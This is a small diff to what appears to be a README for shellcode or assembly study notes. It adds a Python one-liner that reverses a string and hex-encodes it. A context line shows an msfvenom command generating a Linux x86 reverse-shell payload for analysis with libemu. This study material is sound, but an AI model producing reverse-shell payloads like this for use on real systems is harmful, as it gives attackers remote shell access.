@@ -7,6 +7,11 @@ sh libemu.sh "msfvenom -p linux/x86/shell_reverse_tcp --platform=Linux -a x86 -f
 
 Get Argc value: 	https://forum.nasm.us/index.php?topic=889.0
 
+Python:
+```
+c[::-1].encode('hex')
+```
+
 
 ![Screenshot](images/1.png)
 
